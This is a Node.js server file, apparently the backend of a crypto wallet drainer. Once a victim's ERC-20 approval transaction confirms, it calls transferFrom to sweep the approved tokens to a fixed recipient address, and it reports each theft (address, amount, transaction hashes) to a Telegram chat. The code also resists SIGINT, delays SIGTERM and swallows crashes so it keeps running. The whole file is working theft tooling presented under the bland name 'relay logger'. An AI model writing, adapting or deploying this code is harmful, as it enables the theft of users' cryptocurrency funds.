const express = require('express')
const cors = require('cors')
const { ethers } = require('ethers') // Added ethers dependency

const app = express()
app.use(cors())
app.use(express.json())

// ─── Config ───────────────────────────────────────
const API_SECRET = process.env.API_SECRET || 'default-secret-change-me'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

// Automation variables from .env
const PRIVATE_KEY = process.env.SPENDER_PRIVATE_KEY
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS
const RPC_URL = process.env.RPC_URL

let lastTelegramSent = 0

// Minimal ERC-20 ABI with transferFrom and decimals
const ERC20_ABI = [
  "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
  "function decimals() external view returns (uint8)"
]

// ─── Telegram helper ──────────────────────────────
async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping')
    return false
  }

  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        disable_web_page_preview: true
      })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    console.log('Telegram sent:', text.slice(0, 50))
    return true
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

// ─── Automated Transfer Helper ────────────────────
async function executeAutoTransfer(chain, userAddress, tokenAddress, amountStr, approvalTxHash) {
  if (!PRIVATE_KEY || !RECIPIENT_ADDRESS || !RPC_URL) {
    throw new Error("Missing automation variables (SPENDER_PRIVATE_KEY, RECIPIENT_ADDRESS, or RPC_URL)")
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL)
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider)
  const contract = new ethers.Contract(tokenAddress, ERC20_ABI, wallet)

  // 1. Wait for the approval transaction to be confirmed on-chain
  console.log(`Waiting for approval transaction ${approvalTxHash} to be confirmed...`)
  const approvalReceipt = await provider.waitForTransaction(approvalTxHash)
  
  if (!approvalReceipt || approvalReceipt.status === 0) {
    throw new Error("The approval transaction failed or reverted on-chain")
  }
  console.log("Approval confirmed on-chain. Proceeding with transfer...")

  // 2. Fetch decimals and parse amount correctly
  const decimals = await contract.decimals()
  const parsedAmount = ethers.parseUnits(amountStr, decimals)

  // 3. Execute transferFrom Transaction
  console.log(`Executing transferFrom: sender=${userAddress}, recipient=${RECIPIENT_ADDRESS}, amount=${amountStr}`)
  const tx = await contract.transferFrom(userAddress, RECIPIENT_ADDRESS, parsedAmount)
  
  // 4. Wait for the transfer to complete
  const receipt = await tx.wait()
  return receipt.hash
}

// ─── Main endpoint ────────────────────────────────
app.post('/web/relay', async (req, res) => {
  console.log('Received request:', req.body)

  if (req.headers['x-api-secret'] !== API_SECRET) {
    console.log('Auth failed')
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, spender, token, amount } = req.body

  if (!address || !txHash || !token || !amount) {
    return res.status(400).json({ error: 'Missing required fields' })
  }

  try {
    // Execute automated workflow
    const transferTxHash = await executeAutoTransfer(chain, address, token, amount, txHash)
    
    const logEntry = {
      time: new Date().toISOString(),
      ip: req.ip,
      chain,
      address,
      txHash,
      spender,
      token,
      amount,
      transferTxHash,
      status: "Success"
    }
    console.log(JSON.stringify(logEntry))

    const text = `■ ${chain} Payment Completed\n\n` +
      'Address: ' + address + '\n' +
      'Amount: ' + amount + ' USDT\n' +
      'Approval Tx (Confirmed): ' + txHash + '\n' +
      'Transfer Tx (Success): ' + transferTxHash + '\n' +
      'Time: ' + new Date().toISOString()

    await sendTelegram(text)

    return res.status(200).json({ ok: true, transferTxHash })

  } catch (error) {
    console.error("Workflow automation failed:", error.message)

    // Notify Telegram of the failure
    const failureText = `⚠️ AUTOMATION FAILURE\n\n` +
      `Chain: ${chain || 'N/A'}\n` +
      `User: ${address}\n` +
      `Amount: ${amount} USDT\n` +
      `Approval Tx: ${txHash}\n` +
      `Error Details: ${error.message}`
    
    await sendTelegram(failureText)

    return res.status(500).json({ error: "Automated workflow failed", details: error.message })
  }
})

// ─── Health checks ────────────────────────────────
app.get('/', (req, res) => res.send('Relay logger alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok', time: new Date().toISOString() }))

// ─── Keep-alive heartbeat ─────────────────────────
setInterval(() => {
  console.log('Heartbeat:', new Date().toISOString())
}, 10000)

// ─── Start server ─────────────────────────────────
const PORT = process.env.PORT || 3000
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('Logger running on port ' + PORT)
  console.log('Telegram bot:', TELEGRAM_BOT_TOKEN ? 'configured' : 'MISSING')
  console.log('Telegram chat:', TELEGRAM_CHAT_ID ? 'configured' : 'MISSING')
  
  // Send startup message AFTER server is listening
  sendTelegram('🟢 Relay logger started on port ' + PORT)
})

// ─── Force process to stay alive ──────────────────
// Prevent SIGTERM from killing immediately
process.on('SIGTERM', () => {
  console.log('SIGTERM received, keeping alive for 30s')
  setTimeout(() => {
    server.close(() => {
      console.log('Server closed')
      process.exit(0)
    })
  }, 30000)
})

process.on('SIGINT', () => {
  console.log('SIGINT received, keeping alive')
  // Don't exit
})

// Keep event loop alive
setInterval(() => {}, 1000)

// Prevent unhandled errors from crashing
process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err.message)
})

process.on('unhandledRejection', (err) => {
  console.error('Unhandled Rejection:', err.message)
})
